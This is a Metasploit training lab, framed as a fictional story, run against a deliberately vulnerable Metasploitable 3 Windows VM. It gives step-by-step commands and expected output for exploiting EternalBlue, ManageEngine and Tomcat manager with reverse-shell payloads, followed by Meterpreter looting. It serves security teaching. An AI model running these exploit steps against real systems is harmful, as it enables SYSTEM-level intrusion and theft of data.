# MSF-101-W — Bronze Level: Windows
## Operation: Lazarus Protocol — Chapter 1
### *"The First Knock"*

---

> *Grim leaned over his keyboard at 9:43 AM, fresh coffee, fresh workspace.*
> *"Ghost Circuit got into Nexus Dynamics the same way every APT gets in — the basics.*
> *Something old, something unpatched, something a sysadmin told himself he'd fix 'next sprint'.*
> *Let's find those doors."*
>
> *He typed three letters into his terminal: `m`, `s`, `f`.*

---

## Objectives

By the end of this lab you will be able to:

1. Navigate `msfconsole` with confidence (modules, options, sessions)
2. Use **auxiliary modules** to discover services and identify vulnerabilities
3. Exploit **MS17-010 (EternalBlue)** against a Windows Server 2008 target
4. Exploit **ManageEngine Desktop Central** via default credentials / CVE
5. Interact with a basic **Meterpreter session** (sysinfo, getuid, ps, shell)
6. Collect initial **loot** from a compromised host
7. Practice structured, documented engagement habits

---

## Target

| Property         | Value                        |
|------------------|------------------------------|
| OS               | Windows Server 2008 R2 SP1   |
| IP               | `192.168.56.103` (verify!)   |
| Attacker IP      | `192.168.56.1`               |
| Default creds    | vagrant / vagrant            |

---

## Background: The Vulnerability Landscape

### MS17-010 — EternalBlue

In April 2017, the Shadow Brokers leaked NSA exploits. Among them was **EternalBlue**
(MS17-010), a critical vulnerability in Microsoft's SMBv1 implementation. Within weeks,
WannaCry ransomware used it to infect 200,000 machines in 150 countries. NotPetya
followed and caused $10 billion in damage globally.

Metasploitable 3's Windows VM **runs SMBv1 unpatched** — exactly the state thousands of
real enterprise servers still exist in today.

### ManageEngine Desktop Central

A popular enterprise endpoint management platform. The Metasploitable 3 instance runs
a vulnerable version with default credentials and known RCE vulnerabilities. CISA has
published multiple advisories on ManageEngine products being actively exploited by APTs.

---

## Phase 0 — Setup

```bash
# On your attacker machine: start the MSF database
sudo service postgresql start
msfconsole -q

# Create or switch to your workshop workspace
msf6 > workspace -a msf101-windows
msf6 > workspace
# * msf101-windows
```

> **Pro Tip:** Always work in a named workspace. Real engagements have separate
> workspaces per client/scope. It keeps your hosts, services, and loot organized.

---

## Phase 1 — Reconnaissance with Metasploit

### 1.1 — Host Discovery

```bash
# Scan the subnet to find live hosts
msf6 > db_nmap -sn 192.168.56.0/24

# Review what was discovered
msf6 > hosts
```

You should see your Windows target listed. If the IP differs from `192.168.56.103`,
update it in all subsequent commands.

### 1.2 — Service Enumeration

```bash
# Comprehensive service scan — save results to the MSF database
msf6 > db_nmap -sV -sC -p- --open 192.168.56.103

# Review discovered services
msf6 > services
msf6 > services -p 445   # Filter to just SMB
```

Take note of:
- **Port 445** — SMB (our EternalBlue target)
- **Port 8282** — ManageEngine Desktop Central
- **Port 8080** — Apache Tomcat
- **Port 3389** — RDP
- **Port 21**  — FTP

### 1.3 — SMB Enumeration

```bash
# Enumerate SMB version and signing status
msf6 > use auxiliary/scanner/smb/smb2
msf6 auxiliary(smb2) > set RHOSTS 192.168.56.103
msf6 auxiliary(smb2) > run

# Enumerate shares
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(smb_enumshares) > set RHOSTS 192.168.56.103
msf6 auxiliary(smb_enumshares) > run
```

### 1.4 — Check for MS17-010 (EternalBlue)

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.56.103
msf6 auxiliary(smb_ms17_010) > run
```

**Expected output:**
```
[+] 192.168.56.103:445 - Host is likely VULNERABLE to MS17-010!
    (Windows Server 2008 R2 Standard 7601 Service Pack 1)
```

Document this finding. In a real engagement this single line is a critical finding
that immediately requires escalation to the client.

### 1.5 — Web Service Enumeration

```bash
# Scan for common web directories on ManageEngine
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(dir_scanner) > set RHOSTS 192.168.56.103
msf6 auxiliary(dir_scanner) > set RPORT 8282
msf6 auxiliary(dir_scanner) > run

# Check what HTTP server is running
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(http_version) > set RHOSTS 192.168.56.103
msf6 auxiliary(http_version) > set RPORT 8282
msf6 auxiliary(http_version) > run
```

---

## Phase 2 — Exploitation

### Attack Vector 1: EternalBlue (MS17-010)

This is arguably the most famous vulnerability in modern history. A remote,
unauthenticated attacker can execute arbitrary code at SYSTEM level.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info
```

Read the `info` output carefully. Note:
- **CVE:** 2017-0144
- **Reliability:** Average
- **Platform:** Windows
- **Privileged:** Yes (runs as SYSTEM)

```bash
# Configure the exploit
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.103
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.1
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# Check the default payload
msf6 exploit(ms17_010_eternalblue) > show options
```

The default payload is `windows/x64/meterpreter/reverse_tcp`.
This is a **staged payload**: a small stager runs on the target and pulls the
Meterpreter DLL from your listener. Good for small memory buffers.

```bash
# Verify the target is vulnerable before firing
msf6 exploit(ms17_010_eternalblue) > check
# Expected: [+] 192.168.56.103:445 - The target is vulnerable.

# Launch the exploit
msf6 exploit(ms17_010_eternalblue) > run
```

**Expected output:**
```
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] 192.168.56.103:445 - Connecting to target for exploitation.
[+] 192.168.56.103:445 - Connection established for exploitation.
[+] 192.168.56.103:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.56.103:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.103:49159)
```

> You are now inside a Windows Server 2008 R2 system as `NT AUTHORITY\SYSTEM`.
> That is the **highest privilege level on a Windows machine**.
> Ghost Circuit got here before the patch was applied. So did you.

### Troubleshooting EternalBlue

| Problem | Solution |
|---------|----------|
| Session opens then closes | Try `set PAYLOAD windows/x64/shell/reverse_tcp` |
| No session after exploit | Confirm SMBv1 is enabled on target; try `run` again once |
| "Exploit completed but no session" | Try `set target 2` (Windows 7/2008 R2 specific) |

---

### Attack Vector 2: ManageEngine Desktop Central — CVE-2015-8249

ManageEngine Desktop Central 9 contains a file upload vulnerability that allows
unauthenticated remote code execution. This is a classic "enterprise software, terrible security" scenario.

```bash
# Search for ManageEngine exploits
msf6 > search manageengine type:exploit

# Load the Desktop Central upload exploit
msf6 > use exploit/windows/http/manageengine_connectionid_write
msf6 exploit(manageengine_connectionid_write) > info
```

```bash
# Configure
msf6 exploit(manageengine_connectionid_write) > set RHOSTS 192.168.56.103
msf6 exploit(manageengine_connectionid_write) > set RPORT 8282
msf6 exploit(manageengine_connectionid_write) > set LHOST 192.168.56.1

# Check available payloads
msf6 exploit(manageengine_connectionid_write) > show payloads
msf6 exploit(manageengine_connectionid_write) > set PAYLOAD java/meterpreter/reverse_tcp

# Fire
msf6 exploit(manageengine_connectionid_write) > run
```

> **Discussion point:** ManageEngine is used by IT teams to *manage* endpoints.
> An attacker who controls the management platform can push software, scripts, and
> commands to every managed machine in the organization. This is why supply-chain
> attacks through IT management tools are so devastating.

---

## Phase 3 — Post-Exploitation (Basic Meterpreter)

You now have a Meterpreter session. Let's explore what you have access to.

### 3.1 — Basic System Recon

```bash
# List all active sessions
msf6 > sessions

# Interact with session 1
msf6 > sessions -i 1

# Who are we? What system?
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# What processes are running?
meterpreter > ps
```

Scan the process list. Look for:
- `lsass.exe` — Local Security Authority (stores credential hashes)
- `explorer.exe` — Desktop session indicator
- `antivirus.exe` / `msseces.exe` — Security software to note

### 3.2 — File System Exploration

```bash
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\
meterpreter > ls

# Navigate to interesting locations
meterpreter > cd "C:\\Users"
meterpreter > ls

meterpreter > cd "C:\\Users\\vagrant\\Desktop"
meterpreter > ls
```

### 3.3 — Collect Basic Loot

```bash
# Download a file from the target
meterpreter > download C:\\Windows\\System32\\drivers\\etc\\hosts /tmp/win_hosts.txt

# Check what's in the hosts file (note: use the local shell for this)
meterpreter > shell
C:\> type C:\Windows\System32\drivers\etc\hosts
C:\> exit

# Back in meterpreter — screenshot the desktop (if there's an active user session)
meterpreter > screenshot
```

### 3.4 — Network Information

```bash
meterpreter > ipconfig
meterpreter > arp
meterpreter > route
meterpreter > netstat
```

> **Grim's notebook entry:** "Target has a second NIC. 10.0.2.0/24 — internal network.
> Nexus Dynamics' domain controller lives on that segment. This machine is a bridge.
> Ghost Circuit didn't just sit here. They used this box to pivot inward."

This is exactly what you'll do in the Silver and Gold levels.

### 3.5 — Background the Session

```bash
# Background this session (keep it alive, return to msfconsole)
meterpreter > background
# [*] Backgrounding session 1...

# Verify session is still alive
msf6 > sessions
```

---

## Phase 4 — Bonus: Apache Tomcat Manager

Apache Tomcat Manager is a web application that allows deploying `.war` files to a
Tomcat server. When left with default credentials, it's an instant RCE path.

```bash
# Check for Tomcat default credentials
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.56.103
msf6 auxiliary(tomcat_mgr_login) > set RPORT 8080
msf6 auxiliary(tomcat_mgr_login) > run
```

Note the credentials found. Then:

```bash
# Deploy a malicious WAR file to get a shell
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(tomcat_mgr_upload) > set RHOSTS 192.168.56.103
msf6 exploit(tomcat_mgr_upload) > set RPORT 8080
msf6 exploit(tomcat_mgr_upload) > set HttpUsername <found_user>
msf6 exploit(tomcat_mgr_upload) > set HttpPassword <found_pass>
msf6 exploit(tomcat_mgr_upload) > set LHOST 192.168.56.1
msf6 exploit(tomcat_mgr_upload) > run
```

---

## Deliverables

Complete and document the following in a **lab report** (Markdown format):

- [ ] **D1:** Screenshot of `db_nmap` output showing discovered services
- [ ] **D2:** Screenshot showing `[+] Host is likely VULNERABLE to MS17-010`
- [ ] **D3:** Screenshot of successful EternalBlue Meterpreter session (`sysinfo` output)
- [ ] **D4:** Output of `getuid` showing `NT AUTHORITY\SYSTEM`
- [ ] **D5:** Output of `ps` with 3 interesting processes identified and explained
- [ ] **D6:** Screenshot of a second attack vector (ManageEngine OR Tomcat)
- [ ] **D7:** Answer the following discussion questions:

**Discussion Questions:**

1. MS17-010 was patched by Microsoft in March 2017. WannaCry hit in May 2017. What does
   the 2-month window between patch and attack tell us about patch management in enterprise
   environments?

2. Both EternalBlue and ManageEngine give you `SYSTEM`-level access. What is the
   **first three things** you would do as a red teamer after gaining SYSTEM on a target?
   Think about the order of operations.

3. Meterpreter communicates over an encrypted channel. Why does this matter for
   **blue team detection**? What non-signature-based detection methods could catch it?

---

## Cleanup

When done, revert to your clean snapshot:

```bash
# In msfconsole — kill active sessions
msf6 > sessions -K

# In VirtualBox
VBoxManage snapshot "metasploitable3-win2k8" restore "clean-state"
```

---

## What's Next?

You've gotten in. You have SYSTEM. Ghost Circuit would have stopped here on Day 1.
Then they would have spent the next 90 days quietly doing what comes next.

In **MSF-201-W (Silver)**, we go deeper:
- Privilege escalation techniques
- Dumping credential hashes
- Establishing persistence
- Beginning lateral movement

*"The first shell is just the invitation. The real work starts after the door closes behind you."*
— Marcus "Grim" Reeves

---

## Reference

| Module | Purpose |
|--------|---------|
| `auxiliary/scanner/smb/smb_ms17_010` | Detect EternalBlue vulnerability |
| `exploit/windows/smb/ms17_010_eternalblue` | Exploit MS17-010 |
| `exploit/windows/http/manageengine_connectionid_write` | ManageEngine RCE |
| `auxiliary/scanner/http/tomcat_mgr_login` | Tomcat default credential check |
| `exploit/multi/http/tomcat_mgr_upload` | Tomcat WAR deployment shell |
| `auxiliary/scanner/smb/smb_enumshares` | Enumerate SMB shares |
| `auxiliary/scanner/http/dir_scanner` | Web directory brute force |
